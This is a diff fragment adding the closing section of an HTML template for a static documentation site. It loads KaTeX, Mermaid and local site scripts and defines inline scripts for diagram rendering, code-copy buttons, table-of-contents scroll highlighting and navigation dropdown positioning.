+    </footer>
+  </div>
+
+  <!-- 站点原有 extra_javascript（baidu_SEO / katex / statis / FullCalendar 等） -->
+  
+    <script src="../../javascripts/baidu_SEO.js"></script>
+  
+    <script src="../../javascripts/katex.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/contrib/auto-render.min.js"></script>
+  
+    <script src="../../javascripts/statis.js"></script>
+  
+    <script src="../../javascripts/FullCalendar.js"></script>
+  
+    <script src="../../shell/feedback-widget.js"></script>
+  
+
+  <!-- mermaid（material bundle 移除后自行加载） -->
+  <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      if (!window.mermaid) return;
+      document.querySelectorAll("pre.mermaid").forEach(function (el) {
+        var div = document.createElement("div");
+        div.className = "mermaid";
+        div.textContent = el.textContent;
+        el.replaceWith(div);
+      });
+      try {
+        mermaid.initialize({ startOnLoad: false, theme: "neutral" });
+        mermaid.run({ querySelector: ".mermaid" });
+      } catch (e) {}
+    });
+  </script>
+
+  <!-- 代码复制按钮（material bundle 移除后自实现） -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      document.querySelectorAll(".md-typeset pre").forEach(function (pre) {
+        if (pre.querySelector(".hc-copy") || pre.classList.contains("mermaid")) return;
+        var btn = document.createElement("button");
+        btn.className = "hc-copy";
+        btn.textContent = "复制";
+        btn.onclick = function () {
+          var text = pre.innerText.replace(/^复制\n/, "");
+          navigator.clipboard.writeText(text).then(function () {
+            btn.textContent = "已复制";
+            setTimeout(function () { btn.textContent = "复制"; }, 1500);
+          });
+        };
+        pre.appendChild(btn);
+      });
+    });
+  </script>
+
+  <!-- TOC 滚动高亮 -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      var links = Array.from(document.querySelectorAll(".hc-toc a"));
+      if (!links.length) return;
+      var map = links.map(function (a) {
+        var el = document.getElementById(decodeURIComponent(a.getAttribute("href").slice(1)));
+        return el ? { a: a, el: el } : null;
+      }).filter(Boolean);
+      function spy() {
+        var current = null;
+        map.forEach(function (m) { if (m.el.getBoundingClientRect().top <= 80) current = m; });
+        links.forEach(function (a) { a.classList.remove("on"); });
+        if (current) current.a.classList.add("on");
+      }
+      document.addEventListener("scroll", spy, { passive: true });
+      spy();
+    });
+  </script>
+
+  <!-- 顶部导航下拉：fixed 定位避开 overflow 裁剪 -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      document.querySelectorAll(".tn-item").forEach(function (item) {
+        var drop = item.querySelector(".tn-drop");
+        if (!drop) return;
+        item.addEventListener("mouseenter", function () {
+          var r = item.getBoundingClientRect();
+          drop.style.top = r.bottom + "px";
+          var left = Math.min(r.left, window.innerWidth - 240);
+          drop.style.left = Math.max(10, left) + "px";
+        });
+      });
+    });
+  </script>
+
+  
+</body>
+</html>
